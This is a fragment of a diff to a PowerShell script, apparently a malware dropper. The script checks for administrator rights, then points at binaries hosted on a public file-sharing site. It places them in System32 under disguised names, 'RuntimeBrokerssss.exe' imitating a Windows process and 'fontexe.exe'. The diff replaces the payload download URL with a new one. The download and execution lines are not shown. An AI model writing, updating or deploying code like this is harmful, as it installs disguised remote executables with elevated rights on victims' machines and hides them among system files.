@@ -27,7 +27,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "RuntimeBrokerssss.exe"
-$exeUrl = "https://files.catbox.moe/dbhkb7.bin"
+$exeUrl = "https://files.catbox.moe/z6crhs.bin"
 
 # ตัวเลือกที่ 3 - ไฟล์ fontexe
 $fontexeDestination = Join-Path $system32Path "fontexe.exe"
